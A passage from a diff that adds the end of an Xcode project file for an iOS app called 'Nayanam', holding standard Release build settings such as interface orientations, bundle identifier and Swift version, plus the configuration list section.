+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = abc.Nayanam;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		BE17774F2BEB788C00CB5398 /* Build configuration list for PBXProject "Nayanam" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				BE1777602BEB788F00CB5398 /* Debug */,
+				BE1777612BEB788F00CB5398 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		BE1777622BEB788F00CB5398 /* Build configuration list for PBXNativeTarget "Nayanam" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				BE1777632BEB788F00CB5398 /* Debug */,
+				BE1777642BEB788F00CB5398 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = BE17774C2BEB788C00CB5398 /* Project object */;
+}
